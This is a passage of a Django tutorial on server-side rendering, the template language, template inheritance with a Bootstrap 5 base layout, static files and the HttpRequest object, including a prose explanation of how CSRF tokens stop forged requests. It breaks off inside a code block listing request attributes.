# Django Template Architecture + Bootstrap 5

> The Django Template System is the presentation layer of MVT.
> This is where Python objects "die" and turn into a plain HTML string.
> The browser never sees Django tags — only the final HTML.

---

## Introduction: What Server-Side Rendering is and why it matters

### SSR as a printing press

**Mental model:** SSR is like a PRINTING PRESS. Django is the press: it takes a template (the printing plate) and data (the ink), and produces a finished document (HTML). The browser is the READER: it sees only the printed document and never sees either the plate or the ink.

**Key idea:** By the time the browser receives the page, Python no longer exists. Django has FINISHED its work. The HTML is static. You cannot "go back" to Python from the browser — there is only an HTML string.

**Contrast with an SPA (React/Vue):** In an SPA the browser receives an EMPTY HTML + JavaScript, and JavaScript builds the page. With SSR (Django) the browser receives the FULL HTML right away.

**Why SSR matters for SEO:** Google's crawler reads HTML directly. Full HTML from Django = indexed immediately. An SPA with empty HTML = Google sees nothing.

```
SSR vs SPA Timeline:

SSR (Django):
  Request → Server generates FULL HTML → Browser renders → User sees page
  [===== server work =====][= browser render =][USER SEES PAGE]

SPA (React):
  Request → Empty HTML → JS downloads → JS executes → JS fetches data → Renders
  [===][=== JS load ===][=== JS work ===][=== data fetch ===][USER SEES PAGE]
  
SSR wins on: First Contentful Paint, SEO, no-JS environments
SPA wins on: interactivity, subsequent navigation speed
```

**SSR wins on:** First Contentful Paint (FCP), SEO, environments without JavaScript, lower time to first byte (TTFB).
**SPA wins on:** interactivity after loading, speed of subsequent navigation between pages.

---

---
- **🧠 Mental model:** The full SSR cycle is like an assembly line in a factory: each link does its own clearly defined job and passes the result on. The URL Dispatcher is the sorter, the View is the master craftsman, the Template Engine is the assembly line, and the Browser is the end consumer.
- **📚 Why it exists:** Django splits request processing into isolated layers (urls → view → template → response) so that each layer can be understood, tested and changed independently.
- **🌐 What happens under the hood:** Nginx/Gunicorn accepts the TCP connection and passes a WSGI object to Django. Django goes through the middleware, finds the view, runs an ORM query against PostgreSQL, renders the template in memory and returns an HTTP response. The whole process takes milliseconds.
- **❌ Common beginner mistake:** Thinking that "Django sends the template to the browser". No — Django sends ready-made HTML. The browser never sees `{{ note.title }}` — it sees `<h1>Назва нотатки</h1>`.
---

## 0. Server-Side Rendering — The Full Life Cycle

### From an HTTP request to pixels on the screen

This diagram shows the FULL path of a single HTTP request from the browser to pixels on the screen. Notice where Python ends and HTML begins — this is the architectural boundary of SSR.

```
Browser (Client)
    │
    │  1. HTTP GET /notes/42/
    │     Headers: Host, Cookie, Accept-Language
    ▼
Nginx / Gunicorn (web server)
    │
    │  2. WSGI/ASGI → Django Application
    ▼
urls.py  (URL Dispatcher)
    │  URL parsing: /notes/42/ → id=42
    │  Top-to-bottom search, first match
    ▼
View (Python function/class)
    │
    │  3. request.method, request.GET, request.user
    │  4. ORM: Note.objects.get(id=42)
    │       → SQL: SELECT * FROM notes_app_note WHERE id=42
    │       → DB row → Python Note object
    │  5. context = {'note': note, 'user': request.user}
    ▼
Template Engine
    │  6. Load notes_app/note_detail.html from disk
    │  7. Compile: HTML string → tree of Node objects
    │  8. Render: replace {{ note.title }} with real data
    │     Execute {% if %} / {% for %}
    │     Apply {% extends %} / {% block %}
    │     → Final HTML string
    ▼
HttpResponse(html_string, content_type='text/html; charset=utf-8')
    │  Status: 200 OK
    │  Headers: Content-Type, Set-Cookie
    │  Body: <html>...</html>
    ▼
TCP Stream → Browser
    │
    │  9.  Parse HTML → DOM Tree
    │  10. Parse CSS → CSSOM Tree
    │  11. DOM + CSSOM → Render Tree
    │  12. Layout (Flexbox/Grid math)
    │  13. Paint → Pixels on the screen
    ▼
The user sees the note page
```

### The architectural boundary — where Python "dies"

This table clearly shows THREE zones: the Python View (left), the Template Engine as the place of transformation (center), and what the browser actually receives (right). After `render()` the Python objects no longer exist — there are only HTML strings.

```
View (Python)          Template Engine        Browser
──────────────         ───────────────        ──────────
note = Note(...)  →   {{ note.title }}  →   <h1>Назва</h1>
queryset = [...]  →   {% for n in notes%}→   <li>...</li>
user.is_staff     →   {% if user.staff%} →   (conditional HTML)

                       ↑ THE BOUNDARY ↑
Python objects    →    plain HTML string
disappear after        is sent
render()               to the browser
```

---

---
- **🧠 Mental model:** `render()` is like a `print()` function for web pages. But instead of printing to the console, it "prints" an HTML document and sends it to the browser. The context is the arguments you pass to this "print".
- **📚 Why it exists:** Without `render()` you would have to find the template manually, read the file, substitute strings and wrap everything in an HttpResponse. `render()` is a convenient wrapper (shortcut) for four operations at once.
- **🌐 What happens under the hood:** Django looks for the template in the `templates/` folders of every installed app (if `APP_DIRS=True`), compiles it into an internal tree of Node objects (once, then cached), performs rendering — walking the tree and substituting data from the context — and returns a finished HTML string wrapped in an `HttpResponse`.
- **❌ Common beginner mistake:** Forgetting to pass a variable in the context and wondering why the template shows an empty spot. `render()` passes ONLY what you explicitly put into the context dictionary — nothing automatically (except `request` and variables from context processors).
---

## 1. Anatomy of the `render()` function

This code shows the typical structure of a view function. Pay attention to three key things: how the ORM query turns a DB row into a Python object, how the context dictionary is the "bridge" between Python and HTML, and how `render()` takes all this data to generate the response.

```python
from django.shortcuts import render

def note_detail(request, pk):
    note = Note.objects.get(pk=pk)  # ORM → Python object

    context = {                      # dictionary: key → template variable
        'note': note,
        'page_title': 'Деталі нотатки',
        'is_owner': note.user == request.user,
    }

    return render(
        request,              # HttpRequest — middleware, cookies, user
        'notes_app/note_detail.html',  # template path (APP_DIRS=True → searches templates/)
        context               # dictionary that becomes the template context
    )
```

**What happens to the context after render():** All Python objects DISAPPEAR. The browser receives only the resulting HTML. This means you cannot "go back" to a Python object from the browser. Every new request means a new view function call, a new context, a new rendering.

### What `render()` does internally

This expanded code shows WHAT `render()` really is — not magic, but four sequential operations. Once you understand these four steps, you understand the whole SSR mechanism in Django.

```python
# render() is a shortcut for:
from django.template.loader import get_template
from django.http import HttpResponse

def render(request, template_name, context=None):
    # 1. Find the template
    template = get_template(template_name)   # ← reads the file from disk (or cache)

    # 2. Compile (once, then cached)
    # HTML string → tree of Node objects in memory

    # 3. Render — "merge" the context with the template
    html = template.render(context, request)

    # 4. Wrap it in an HTTP response
    return HttpResponse(html, content_type='text/html; charset=utf-8')
```

---

---
- **🧠 Mental model:** The context is like the "variable scope" inside a template. Imagine entering a new room (the template): everything you brought with you (the context) is available. Everything left outside (Python) is not.
- **📚 Why it exists:** The context provides explicit data passing between the MVT layers. Instead of "magic global variables", each template receives only what was explicitly passed to it. This makes the code predictable and easy to test.
- **🌐 What happens under the hood:** Dot-lookup is an algorithm: Django tries 4 different ways of accessing data in a defined order. It stops at the first one that succeeds. If none works, it returns `''` (an empty string). No exception is raised.
- **❌ Common beginner mistake:** Writing `{{ note.titel }}` instead of `{{ note.title }}` and hunting the bug for hours because the template silently shows an empty spot. Fail Silently is intentional Django behavior for production, but it makes debugging in development harder. Always use the Django Debug Toolbar to check the context.
---

## 2. Context and the Dot-Lookup System

### Passing data from the View to the template

This code demonstrates the different data types you can pass in the context: QuerySet, int, string, bool and a nested dict. Note: the dictionary keys become VARIABLE NAMES in the template — `'notes'` becomes `{{ notes }}`, `'total'` becomes `{{ total }}`.

```python
# views.py
def note_list(request):
    notes = Note.objects.all().order_by('-created_at')
    context = {
        'notes': notes,             # QuerySet
        'total': notes.count(),     # int
        'user_name': request.user.username,  # string
        'is_staff': request.user.is_staff,   # bool
        'settings': {               # nested dict
            'per_page': 10,
            'show_dates': True,
        },
    }
    return render(request, 'notes_app/note_list.html', context)
```

### Dot-Lookup — lookup order

Dot-lookup is Django's "smart accessor": `{{ note.title }}` is not simple attribute access. Django tries four different approaches automatically, which lets you use the same syntax for dictionaries, objects, methods and lists.

When a template encounters `{{ foo.bar }}`, Django tries in turn:

```
1. Dictionary key lookup:      foo['bar']
2. Object attribute lookup:    foo.bar
3. Call without arguments:     foo.bar()
4. Index lookup:               foo[bar]
```

These examples show dot-lookup in action on different data types. `{{ notes.0.title }}` is three levels of dot-lookup: index → ORM object → CharField attribute. `{{ notes.count }}` calls the `.count()` method without parentheses — Django does this automatically (step 3 of the algorithm).

```html
{# notes — QuerySet (list-like) #}
{{ notes.0.title }}           {# → the first note, the title field #}
{{ notes.count }}             {# → the count() method without () in the template #}

{# note — Model instance #}
{{ note.title }}              {# → attribute (CharField) #}
{{ note.created_at.year }}    {# → datetime attribute → .year #}
{{ note.user.username }}      {# → ForeignKey → attribute #}

{# settings — nested dict #}
{{ settings.per_page }}       {# → dict['per_page'] = 10 #}

{# request — HttpRequest object #}
{{ request.user.is_staff }}   {# → object.attr.attr #}
{{ request.GET.q }}           {# → dict-like: request.GET['q'] #}
```

### Fail Silently — silently ignoring errors

**THE DANGER of silent ignoring:** `{{ note.titel }}` (a typo in the name) shows nothing and gives NO error at all. This is an intentional design decision (to avoid crashing production because of a typo), but it means you need the Debug Toolbar for diagnostics. Never trust an "empty spot" in a template — always check the context with DjDT.

```html
{# The variable 'missing_var' is not in the context #}
<p>{{ missing_var }}</p>
{# → the browser will see: <p></p> — an empty string, NOT an error #}

{# Danger: a typo in the variable name → an empty page without an error #}
{{ note.titel }}  {# 'titel' instead of 'title' → silently empty #}
```

> **Debugging:** if a variable is not displayed, open the Django Debug Toolbar
> → Templates Panel → Toggle context. You will see the exact dictionary the template received.

---

---
- **🧠 Mental model:** DTL (Django Template Language) is an intentionally SIMPLIFIED language. Imagine Python with everything dangerous removed: no arbitrary code execution, no import, no method calls with arguments. DTL is closer to a form-filling language than to a programming language.
- **📚 Why it exists:** Separation of Concerns is a principle of MVT. Templates are responsible for PRESENTATION. Business logic belongs in the view or model. DTL is intentionally limited to make it impossible for logic to "leak" into the template.
- **🌐 What happens under the hood:** DTL compiles the template into Python objects (NodeList) once on the first request and then caches the result. Subsequent requests use the cached compiled template — this is much faster than re-parsing the file.
- **❌ Common beginner mistake:** Trying to call Python methods with arguments: `{{ form.fields.get('title') }}` — this does not work! DTL does not allow passing arguments when calling methods. If you need complex logic, do it in the view and pass the finished result.
---

## 3. DTL Syntax — full reference

### The two kinds of DTL syntax

Before reading further, remember the fundamental distinction between the two DTL constructs:

```
{{ }} = OUTPUT a value (like print() in Python)
{% %} = EXECUTE a tag (like if/for/with in Python)
```

**Mental model:**
- `{{ }}` is a hole in the template where a value is inserted. 
- `{% %}` is a command that does something (checks a condition, creates a loop, loads tags). 
- The browser never sees either `{{ }}` or `{% %}` — only the result of their work.

**Why you cannot call `{{ note.delete() }}`:** DTL prevents dangerous operations from being executed from templates. This is a FEATURE, not a limitation. Imagine if anyone could delete data from the DB just by passing `?template=delete_all` in the URL. DTL makes such attacks impossible by default.

### Variables `{{ }}`

`{{ }}` is the main way to display data. Pay attention to filters — they are applied with `|` and let you format data right in the template. The filter chain `|truncatewords:30|lower` is executed from left to right.

```html
{{ note.title }}                         {# string #}
{{ note.created_at|date:"d.m.Y H:i" }}  {# with a filter #}
{{ notes|length }}                       {# QuerySet length #}
{{ note.content|truncatewords:30|lower }} {# filter chain #}
```

### Tags `{% %}` — logic

The `{% if %}` block in Django supports all the standard Python comparisons. The `and`, `or`, `not` operators are the same as in Python. But remember: complex conditional logic in a template is a sign that the logic should be moved into the view.

```html
{# if / elif / else #}
{% if user.is_authenticated %}
    <span>Привіт, {{ user.username }}!</span>
{% elif user.is_staff %}
    <span>Staff користувач</span>
{% else %}
    <a href="{% url 'login' %}">Увійти</a>
{% endif %}

{# Operators: ==, !=, <, >, <=, >=, in, not in, is, is not #}
{% if notes|length > 0 and user.is_active %}
{% if status == "published" or status == "draft" %}
{% if not note.is_deleted %}
```

The `{% for %}` loop with the `{% empty %}` tag. **ALWAYS use `{% empty %}`** for QuerySets! Without it, an empty list renders nothing — the user sees a blank page with no explanation. With `{% empty %}` you explicitly show "there is nothing here" instead of "something broke".

`forloop.counter` vs `forloop.counter0`: use `counter` for human-readable numbers (1, 2, 3...), and `counter0` for CSS classes or array indexes (0, 1, 2...). `forloop.first` and `forloop.last` let you style the first/last element without JavaScript.

```html
{# for / empty #}
{% for note in notes %}
    <div class="card">{{ note.title }}</div>
{% empty %}
    <p>Нотаток немає.</p>   {# if the QuerySet is empty #}
{% endfor %}

{# Loop variables #}
{% for note in notes %}
    {{ forloop.counter }}     {# 1, 2, 3... (starting from 1) #}
    {{ forloop.counter0 }}    {# 0, 1, 2... (starting from 0) #}
    {{ forloop.revcounter }}  {# reverse: N, N-1... #}
    {{ forloop.first }}       {# True if this is the first element #}
    {{ forloop.last }}        {# True if this is the last element #}
    {{ forloop.parentloop }}  {# access to the outer loop #}

    {# Conditional classes based on the loop #}
    <div class="card {% if forloop.first %}border-primary{% endif %}">
        {{ note.title }}
    </div>
{% endfor %}
```

`{% url %}` — safe URL generation by route name. Never hardcode URLs in templates! If you change a URL route in `urls.py`, `{% url %}` updates automatically everywhere. A hardcoded `/notes/42/` will stay broken in hundreds of places.

```html
{# url — safe URL generation by name #}
<a href="{% url 'notes_app:note_list' %}">Всі нотатки</a>
<a href="{% url 'notes_app:note_detail' pk=note.pk %}">{{ note.title }}</a>
<form action="{% url 'notes_app:note_delete' pk=note.pk %}" method="post">
```

**CSRF protection — a detailed explanation:**

A CSRF (Cross-Site Request Forgery) attack is one of the most common web attacks. Here is how it works and how `{% csrf_token %}` protects against it:

```
CSRF Attack (without protection):
  1. The user logs in to bank.com → receives a session cookie
  2. The user visits evil.com
  3. evil.com silently sends a POST to bank.com/transfer/ with the session cookie
  4. Bank.com thinks: "this is the real user!" → performs the transfer!

CSRF Token Defense (with {% csrf_token %}):
  1. Django generates a random token when rendering the form
  2. The token is inserted into the HTML form as a hidden field
  3. The token is also stored in a browser cookie
  4. On POST, Django checks: token in the form == token in the cookie?
  5. evil.com cannot read the token from another domain (Same-Origin Policy)
  6. A POST from evil.com does not contain the correct token → 403 Forbidden!

{% csrf_token %} generates:
<input type="hidden" name="csrfmiddlewaretoken" value="abc123xyz...">
```

The `{% csrf_token %}` tag is MANDATORY in all POST forms. Without it Django will return `403 Forbidden`. This is not a Django bug — it is protection against real attacks.

```html
{# csrf_token — mandatory in POST forms #}
<form method="post">
    {% csrf_token %}
    ...
</form>

{# comment — does not end up in the HTML #}
{# This is a comment — the browser will not see it #}
{% comment %}
    A multi-line comment
    spanning several lines
{% endcomment %}

{# with — shorten a long expression or store a result #}
{% with full_name=user.first_name|add:" "|add:user.last_name %}
    <span>{{ full_name }}</span>
{% endwith %}
```

### Filters `{{ var|filter }}`

Filters are data transformation functions right in the template. The syntax is `{{ value|filter:argument }}`. They can be chained: `{{ value|filter1|filter2 }}`. But remember: complex data processing belongs in the view, not in a chain of filters.

```html
{# Text #}
{{ note.title|lower }}           {# lowercase #}
{{ note.title|upper }}           {# UPPERCASE #}
{{ note.title|capfirst }}        {# First letter capitalized #}
{{ note.title|title }}           {# Every Word Capitalized #}
{{ note.content|truncatewords:30 }} {# truncate to 30 words #}
{{ note.content|truncatechars:100 }} {# truncate to 100 characters #}
{{ note.content|wordcount }}     {# word count #}
{{ note.content|linebreaks }}    {# \n → <br> → <p> #}
{{ note.content|linebreaksbr }}  {# \n → <br> (br only) #}
{{ note.content|striptags }}     {# remove all HTML tags #}

{# Numbers #}
{{ price|floatformat:2 }}        {# 1500.00 #}
{{ count|filesizeformat }}       {# 1.5 MB #}

{# Date and time #}
{{ note.created_at|date:"d.m.Y" }}       {# 21.05.2026 #}
{{ note.created_at|date:"d F Y" }}       {# 21 May 2026 #}
{{ note.created_at|time:"H:i" }}         {# 14:30 #}
{{ note.created_at|timesince }}          {# "3 days ago" #}
{{ note.created_at|timeuntil }}          {# "in 2 days" #}

{# Lists and QuerySets #}
{{ notes|length }}               {# number of elements #}
{{ notes|first }}                {# first element #}
{{ notes|last }}                 {# last element #}
{{ tags|join:", " }}             {# join the list with ", " #}
{{ notes|slice:":3" }}           {# first 3 elements #}

{# Security #}
{{ user_input|escape }}          {# HTML escaping (default) #}
{{ trusted_html|safe }}          {# disable escaping (careful!) #}
{{ html_content|striptags }}     {# remove HTML tags #}
{{ value|default:"Не вказано" }} {# value if None or '' #}
{{ value|default_if_none:"—" }}  {# only if None #}

{# URLs and images #}
{{ url|urlencode }}              {# encode URL parameters #}
{{ text|slugify }}               {# "Hello World" → "hello-world" #}
```

---

---
- **🧠 Mental model:** Template Inheritance is like CLASS INHERITANCE in Python. `base.html` is the parent class with default methods. Child templates with `{% extends %}` "inherit" the base one and "override" specific `{% block %}` methods. `{{ block.super }}` is `super()` in Python.
- **📚 Why it exists:** DRY (Don't Repeat Yourself). Without inheritance every page would repeat the navbar, footer and Bootstrap includes. Changing one line in the navbar would require editing 50 files. With `base.html` — one place, one line.
- **🌐 What happens under the hood:** When rendering a child template, Django first loads the PARENT template (recursively, if there are several levels of inheritance), then replaces the `{% block %}` sections with the contents of the child template, and only after that renders the result with the context.
- **❌ Common beginner mistake:** Not putting `{% extends 'base.html' %}` on the first line — or putting text before it. `{% extends %}` MUST be the first tag in the file (only comments are allowed before it). Any text or HTML before `{% extends %}` will cause an error or be ignored.
---

## 4. Template Inheritance — The inheritance system

**Why not just `{% include %}`?** `include` copies a file into the current location — it is for COMPONENTS (buttons, cards, navbar fragments). `extends` REPLACES specific sections of the parent template — it is for page STRUCTURE. The difference is fundamental: `include` means "insert a piece of HTML here", `extends` means "this page is a variant of the parent".

**Three-level hierarchy — a production pattern:**
```
base.html → defines the HTML shell, Bootstrap, Navbar, Footer
    ↓ extends
layouts/section.html → defines the structure of a specific section
    ↓ extends
feature/page.html → only the unique content of the page
```

### Three-level architecture

```
base.html              ← Global skeleton: <html>, Bootstrap, Navbar, Footer
    │
    ├── base_notes.html ← Section skeleton: section heading, breadcrumbs
    │       │
    │       ├── note_list.html    ← List of notes
    │       └── note_detail.html  ← Note details
    │
    └── base_auth.html  ← Auth skeleton: a centered form
            │
            ├── login.html        ← Login form
            └── register.html     ← Registration form
```

### base.html — the base skeleton

**A step-by-step reading of `base.html`** — this file is large, but every block solves a specific task. Read it as a layered architecture:

```
base.html — anatomy layer by layer:

┌──────────────────────────────────────────────────────┐
│ <head>                                               │
│   {% block title %} — browser tab title              │
│   {% block meta %} — SEO tags                        │
│   Bootstrap CDN CSS — base styles                    │
│   {% block extra_css %} — slot for children's CSS    │
├──────────────────────────────────────────────────────┤
│ <body>                                               │
│   {% block navbar %} — navigation (sticky-top)       │
│   ─────────────────────────────────────────────────  │
│   {% if messages %} — Django messages (alerts)       │
│   ─────────────────────────────────────────────────  │
│   <main>                                             │
│     {% block breadcrumbs %} — navigation path        │
│     {% block page_header %} — page heading           │
│     {% block content %} — THE MAIN SLOT              │
│   </main>                                            │
│   ─────────────────────────────────────────────────  │
│   <footer> — the footer                              │
│   Bootstrap CDN JS — components (modal, collapse...) │
│   {% block extra_js %} — slot for children's JS      │
└──────────────────────────────────────────────────────┘
```

**Why `class="d-flex flex-column min-vh-100"` on `<body>`:** This is a classic Bootstrap Flexbox trick for a "sticky footer". `min-vh-100` — a minimum height of 100% of the viewport. `flex-column` — vertical Flexbox. `flex-grow-1` on `<main>` — main takes up all the free space. The footer "sticks" to the bottom even on short pages.

**Note `sticky-top` on the navbar:** The Bootstrap class `sticky-top` adds `position: sticky; top: 0` — the navbar stays visible while scrolling. Without it the navbar scrolls together with the page.

This file is the HEART of your project. Pay attention to the `{% block %}` strategy: every `{% block %}` is a "slot" that a child template can fill or replace. If a child template does not define a `{% block %}`, the contents of the parent block are used (or nothing, if the parent block is empty too). Pay special attention to `{% block extra_css %}` and `{% block extra_js %}` — they let each page include its own styles and scripts without changing base.html.

```html
{% load static %}
<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    {# TITLE: a child template can override it #}
    <title>{% block title %}Нотатки{% endblock %} | MySite</title>

    {# Meta tags: a child can add specific ones #}
    {% block meta %}
    <meta name="description" content="Система нотаток на Django">
    {% endblock %}

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
          rel="stylesheet">

    {# CSS: a child can add its own styles #}
    {% block extra_css %}{% endblock %}
</head>
<body class="d-flex flex-column min-vh-100">

    {# NAVBAR: can be overridden in a child #}
    {% block navbar %}
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark sticky-top">
        <div class="container">
            <a class="navbar-brand" href="{% url 'notes_app:index' %}">📝 Нотатки</a>
            <button class="navbar-toggler" type="button"
                    data-bs-toggle="collapse" data-bs-target="#navMenu">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navMenu">
                <ul class="navbar-nav me-auto">
                    <li class="nav-item">
                        <a class="nav-link {% block nav_index %}{% endblock %}"
                           href="{% url 'notes_app:index' %}">Головна</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link {% block nav_notes %}{% endblock %}"
                           href="{% url 'notes_app:note_list' %}">Нотатки</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    {% endblock %}

    {# MESSAGES: always displayed in base #}
    {% if messages %}
    <div class="container mt-3">
        {% for message in messages %}
        <div class="alert alert-{{ message.tags }} alert-dismissible fade show" role="alert">
            {{ message }}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        </div>
        {% endfor %}
    </div>
    {% endif %}

    {# MAIN CONTENT: filled in by each child template #}
    <main class="container py-4 flex-grow-1">
        {# Breadcrumbs: a child can add them #}
        {% block breadcrumbs %}{% endblock %}

        {# Page heading: a child can add it #}
        {% block page_header %}{% endblock %}

        {# Main content #}
        {% block content %}{% endblock %}
    </main>

    <footer class="bg-dark text-light py-3 mt-auto">
        <div class="container text-center">
            <small>© 2026 | Django + Bootstrap 5</small>
        </div>
    </footer>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

    {# JS: a child can add its own scripts #}
    {% block extra_js %}{% endblock %}
</body>
</html>
```

### Child template

This is a minimal child template — it fills only the blocks it needs. All unfilled blocks (for example `{% block meta %}`) use the contents of the parent template. Notice that `{% block content %}` contains ONLY the unique content of this page — the whole skeleton (navbar, footer, Bootstrap CSS) is already in base.html.

```html
{% extends 'notes_app/base.html' %}  {# ALWAYS THE FIRST LINE #}

{% block title %}Мої нотатки{% endblock %}

{% block nav_notes %}active{% endblock %}  {# active menu item #}

{% block breadcrumbs %}
<nav aria-label="breadcrumb" class="mb-3">
    <ol class="breadcrumb">
        <li class="breadcrumb-item"><a href="{% url 'notes_app:index' %}">Головна</a></li>
        <li class="breadcrumb-item active">Нотатки</li>
    </ol>
</nav>
{% endblock %}

{% block page_header %}
<div class="d-flex justify-content-between align-items-center mb-4">
    <h1 class="h3">Мої нотатки</h1>
    <a href="{% url 'notes_app:note_create' %}" class="btn btn-primary">+ Нова</a>
</div>
{% endblock %}

{% block content %}
{# ONLY THE UNIQUE CONTENT OF THIS PAGE #}
<div class="row row-cols-1 row-cols-md-3 g-4">
    {% for note in notes %}
    <div class="col">
        <div class="card h-100">
            <div class="card-body">
                <h5 class="card-title">{{ note.title }}</h5>
                <p class="card-text text-muted">{{ note.content|truncatewords:15 }}</p>
            </div>
        </div>
    </div>
    {% endfor %}
</div>
{% endblock %}

{% block extra_js %}
{# JavaScript only for this page #}
<script>
    console.log('note_list page loaded');
</script>
{% endblock %}
```

**About `{{ block.super }}`:** Sometimes you do not want to REPLACE the contents of the parent block but to EXTEND them. `{{ block.super }}` inserts the contents of the parent block and lets you add your own:

- **Without `{{ block.super }}`:** the child block COMPLETELY REPLACES the parent one.
- **With `{{ block.super }}`:** the child block EXTENDS the parent block with its own content.
- **A real-world case:** the parent has `{% block extra_css %}{% endblock %}` — empty. The child adds CSS for this page. But if the parent already has some CSS in the block, `{{ block.super }}` will keep it and add the new one.

Example: the parent defines base scripts in `{% block extra_js %}`, and the child page wants to add its own scripts WITHOUT removing the parent's:
```html
{% block extra_js %}
{{ block.super }}  {# ← keep everything that was in the parent block #}
<script src="{% static 'notes_app/js/notes-specific.js' %}"></script>
{% endblock %}
```

### `{% include %}` — components

`{% include %}` is for COMPONENTS (repeated parts of the interface): a note card, a user avatar, pagination. The key difference: `include` does not inherit — it simply inserts a file at the current location. The `with` parameter passes additional variables. The `only` parameter isolates the component's context.

```html
{# Reusable components — separate files #}
{% include 'notes_app/components/note_card.html' %}

{# Passing additional variables #}
{% include 'notes_app/components/note_card.html' with note=note show_footer=True %}

{# Isolated context (only the passed variables, without the main context) #}
{% include 'notes_app/components/note_card.html' with note=note only %}
```

This is the component file — it receives `note` and `show_footer` from the `with` parameters. Notice the conditional `{% if show_footer %}` — the component adapts depending on where it is used.

```html
{# notes_app/components/note_card.html #}
<div class="card h-100 border-0 shadow-sm">
    <div class="card-body">
        <h5 class="card-title">
            <a href="{% url 'notes_app:note_detail' pk=note.pk %}"
               class="text-decoration-none text-dark">
                {{ note.title }}
            </a>
        </h5>
        <p class="card-text text-muted">{{ note.content|truncatewords:20 }}</p>
    </div>
    {% if show_footer %}
    <div class="card-footer bg-transparent border-0">
        <small class="text-muted">{{ note.created_at|date:"d.m.Y" }}</small>
    </div>
    {% endif %}
</div>
```

---

---
- **🧠 Mental model:** Static files (CSS, JS, images) are CARGO that Django carries only during development. In production Django hands this cargo over to Nginx — a much stronger loader. `{% load static %}` is like "bringing in the forklift" before working with the cargo.
- **📚 Why it exists:** `{% static 'path' %}` turns a relative path into an absolute URL, taking `STATIC_URL` from settings.py into account. If you move static files to a CDN (CloudFront, S3), you change only `STATIC_URL` — and ALL links in the templates update automatically.
- **🌐 What happens under the hood:** In development Django looks for static files in the `static/` folders of every app (if `DEBUG=True`). In production `python manage.py collectstatic` gathers all static files into a single `STATIC_ROOT` folder, from which Nginx serves them directly — without calling Python at all.
- **❌ Common beginner mistake:** Forgetting `{% load static %}` at the top of the template and getting `TemplateSyntaxError: Invalid block tag: 'static'`. Or hardcoding `/static/css/style.css` instead of `{% static 'path' %}` — such links will break when deployed to a server with a different STATIC_URL.
---

## 5. Static Files

**Why static files are NOT Django's job in production:**
```
Development: 
  Browser → Django (DEBUG=True) → finds the static files → responds

Production:
  1. python manage.py collectstatic → copies ALL static files into STATIC_ROOT
  2. Browser → Nginx → finds the file in STATIC_ROOT → responds
  3. Django takes no part in serving static files at all!
  4. Much faster: no Python overhead for CSS/JS/images
```

**Why `{% static 'path' %}` instead of hardcoding:** if `STATIC_URL` changes (for example, when moving to a CDN: `STATIC_URL = 'https://cdn.example.com/static/'`), all your template links will update automatically. A hardcoded URL `/static/css/style.css` will stay broken.

### Configuration

These three settings.py settings define where Django looks for static files, where it serves them from, and where it collects them for production. `STATICFILES_DIRS` is for custom files outside the apps. `STATIC_ROOT` is only for `collectstatic`.

```python
# settings.py
STATIC_URL = '/static/'

# Folder for storing custom static files
STATICFILES_DIRS = [
    BASE_DIR / 'static',
]

# For production: where to collect all static files
STATIC_ROOT = BASE_DIR / 'staticfiles'
```

### Folder structure

```
notes_app/
└── static/
    └── notes_app/            ← namespace (the app name)
        ├── css/
        │   ├── custom.css    ← custom styles on top of Bootstrap
        │   └── dark-theme.css
        ├── js/
        │   └── notes.js      ← JS for notes
        └── img/
            └── logo.png
```

### Using them in templates

Note: `{% load static %}` must come FIRST in the file, before any use of `{% static %}`. Bootstrap is included via a CDN — it is not "your" static file, so it does not need `{% static %}`. Your custom CSS is included via `{% static %}`.

```html
{% load static %}  {# MANDATORY before the first {% static %} #}
<!DOCTYPE html>
<html>
<head>
    {# Bootstrap CSS — CDN (not via {% static %}) #}
    <link href="https://cdn.jsdelivr.net/...bootstrap.min.css" rel="stylesheet">

    {# Custom CSS — via {% static %} #}
    <link rel="stylesheet" href="{% static 'notes_app/css/custom.css' %}">

    {# Favicon #}
    <link rel="icon" href="{% static 'notes_app/img/favicon.ico' %}">
</head>
<body>
    {# Images #}
    <img src="{% static 'notes_app/img/logo.png' %}" alt="Логотип" width="120">

    {# JavaScript #}
    <script src="{% static 'notes_app/js/notes.js' %}"></script>
</body>
</html>
```

### `collectstatic` for production

**What happens to your static files from development to production:**

```
Development:
  Browser → Django dev server (runserver)
              ↓
              Django finds the static files in notes_app/static/
              and serves them directly
              (slow, but convenient — changes are visible immediately)

Production:
  STEP 1: python manage.py collectstatic
              ↓
              Walks through static/ in EVERY installed app
              + django.contrib.admin/static/
              + unfold/static/
              ↓
              Copies EVERYTHING into STATIC_ROOT=/app/staticfiles/

  STEP 2: Nginx configuration:
              location /static/ {
                alias /app/staticfiles/;   ← straight from disk
              }
              ↓
  Browser → Nginx → staticfiles/ on disk
              Django TAKES NO PART AT ALL
              (100x faster for static files)
```

`collectstatic` is a one-time command run during deployment. It walks through all installed apps, finds their `static/` folders and copies the contents into `STATIC_ROOT`. After that, Nginx serves these files without Django's involvement.

```bash
# Collects all static files from all apps into STATIC_ROOT
python manage.py collectstatic

# Nginx serves static files directly — without Django
# location /static/ {
#     alias /app/staticfiles/;
# }
```

> **Anti-pattern:** hardcoding static URLs — `/static/css/style.css`.
> If STATIC_URL changes or a CDN is added, everything breaks.
> Always use `{% static 'path' %}`.

---

## 6. HttpRequest and HttpResponse — The HTTP level

### HttpRequest — what Django receives

Notice how complete the `request` object is: it contains everything about the HTTP request. `request.user` is available because `AuthenticationMiddleware` processes every request and sets `request.user` automatically.

```python
def note_detail(request, pk):
    # request — an HttpRequest object with all the request data

    request.method      # 'GET', 'POST', 'PUT', 'DELETE'
    request.GET         # QueryDict: GET parameters from the URL (?q=django&page=2)
    request.POST        # QueryDict: POST data from the form
    request.FILES       # Uploaded files
    request.headers     # HTTP headers (User-Agent, Accept-Language, ...)
    request.COOKIES     # Browser cookies
    request.session     # Django session (dict-like)
    request.user        # Authenticated user (AnonymousUser or User)
    request.path        # '/notes/42/'
    request.META        # The full WSGI environ
